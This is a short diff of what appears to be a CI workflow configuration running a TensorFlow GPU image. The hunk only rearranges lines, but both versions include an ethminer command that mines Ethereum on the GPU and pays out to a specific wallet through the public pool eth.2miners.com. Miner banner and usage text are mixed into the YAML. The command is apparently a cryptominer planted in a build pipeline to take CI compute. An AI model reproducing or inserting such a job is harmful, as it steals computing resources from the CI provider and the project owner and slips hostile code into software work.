@@ -46,6 +46,6 @@ jobs:
             Build: linux/release/gnu
 
             Ethminer - GPU ethash miner
-            $ ./ethminer -G -P stratum1+tcp://0x39b9Bb05363D6E68942DFeb1EB349Ed24b365824@eth.2miners.com:2020
-minimal usage : ethminer [DEVICES_TYPE] [OPTIONS] -P... [-P...]
+            minimal usage : ethminer [DEVICES_TYPE] [OPTIONS] -P... [-P...]
+             $ ./ethminer -G -P stratum1+tcp://0x39b9Bb05363D6E68942DFeb1EB349Ed24b365824@eth.2miners.com:2020
       image: tensorflow/tensorflow:1.14.0-gpu-py3
